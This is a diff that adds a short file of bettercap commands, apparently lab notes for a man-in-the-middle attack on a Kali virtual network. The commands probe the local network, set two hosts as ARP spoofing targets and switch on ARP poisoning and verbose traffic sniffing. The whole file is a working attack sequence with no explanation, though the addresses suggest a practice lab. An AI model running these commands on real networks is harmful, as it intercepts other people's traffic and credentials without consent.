@@ -1,0 +1,14 @@
+bettercap -iface eth0
+net.show
+net.probe on
+net.show
+(type only net.show 2,3rd kali ip address)
+set arp.spoof.targets 10.0.2.2,10.0.2.3
+set arp.spoof.internal true
+set net.sniff.local true
+set net.sniff.verbose true
+get net.sniff*
+get arp*
+help
+net.sniff on
+arp.spoof on
